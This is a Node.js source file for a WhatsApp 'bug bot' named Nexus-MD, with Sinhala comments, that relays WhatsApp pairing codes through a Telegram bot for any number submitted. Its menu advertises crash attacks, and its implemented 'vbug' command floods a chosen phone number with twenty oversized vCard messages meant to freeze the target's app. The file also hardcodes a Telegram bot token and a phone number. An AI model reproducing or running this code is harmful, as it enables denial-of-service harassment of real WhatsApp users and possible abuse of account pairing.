const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    DisconnectReason,
    getContentType,
    Browsers
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809"; // උඹේ නම්බර් එක
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Desktop") 
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ 🛠️ TELEGRAM PUBLIC PAIRING - NO ERROR ] ---
    tgBot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (!text) return;

        if (text === '/start') {
            return tgBot.sendMessage(chatId, `👋 *Welcome to Nexus-MD Bug System!*\n\nPairing Code එකක් ගන්න නම්බර් එක එවන්න:\n\n👉 \`/pair 947xxxxxxxx\``, { parse_mode: "Markdown" });
        }

        if (text.startsWith('/pair ')) {
            let target = text.replace('/pair ', '').replace(/[^0-9]/g, '');
            if (target.length < 10) return tgBot.sendMessage(chatId, "❌ නම්බර් එක වැරදියි මචං!");

            await tgBot.sendMessage(chatId, `⏳ *${target}* සඳහා කෝඩ් එක ජෙනරේට් කරනවා... ප්ලීස් තත්පර 10ක් ඉන්න.`);

            try {
                const tempDir = `./temp_${target}`;
                const { state: tState } = await useMultiFileAuthState(tempDir);
                
                const tSock = makeWASocket({
                    auth: tState,
                    logger: pino({ level: "silent" }),
                    browser: Browsers.macOS("Desktop")
                });

                // කෝඩ් එක ලැබෙනකම් රික්වෙස්ට් කරන ලොජික් එක
                setTimeout(async () => {
                    try {
                        let code = await tSock.requestPairingCode(target);
                        if (code) {
                            let formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                            const res = `🔥 *NEXUS-MD PAIRING SUCCESS*\n\n` +
                                        `📍 *Target:* ${target}\n` +
                                        `🔑 *Code:* \`${formattedCode}\` \n\n` +
                                        `මේ කෝඩ් එක WhatsApp එකේ ගහපන් මචං!`;
                            
                            await tgBot.sendMessage(chatId, res, { parse_mode: "Markdown" });
                            console.log(`✅ Code Sent for ${target}: ${formattedCode}`);
                        }
                    } catch (e) {
                        tgBot.sendMessage(chatId, "❌ කෝඩ් එක ලැබුණේ නැහැ. නම්බර් එක චෙක් කරලා ආයෙ ට්‍රයි කරන්න.");
                    } finally {
                        setTimeout(() => { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true }); }, 20000);
                    }
                }, 8000); 

            } catch (err) { tgBot.sendMessage(chatId, "❌ System Error!"); }
        }
    });

    // --- [ 💀 ULTRA BUG ATTACK SYSTEM ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- THE GRAND BUG MENU ---
        if (command === 'menu') {
            const menu = `
⚡ *NEXUS-MD V5.5 ULTRA BUG MENU* ⚡
 
👋 *Hello Sasiya MD!*
🛡️ *Status:* Online ✅

*─── [ 🔗 PUBLIC PAIRING ] ───*
◈ Telegram: /pair [number]

*─── [ 💀 ULTRA BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash ⚰️
◈ ${prefix}cbug - Char Overflow Bug
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}crash - System Total Freeze
◈ ${prefix}pbug - Poll Unlimited Bug
◈ ${prefix}tagbug - Contact Tag Crash

*─── [ 🛠️ TOOLS ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}reboot - Restart

🚀 *Powered by Developer Nexus*
            `;
            await sock.sendMessage(from, { 
                text: menu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS-MD BUG SYSTEM",
                        body: "Created by Sasiya MD",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        // ULTRA VCARD BUG
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(500);
            await sock.sendMessage(from, { text: "💀 Vcard Mega Attack Starting..." });
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 400));
            }
            sock.sendMessage(from, { text: "✅ Done! Target Freezed." });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus-MD Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
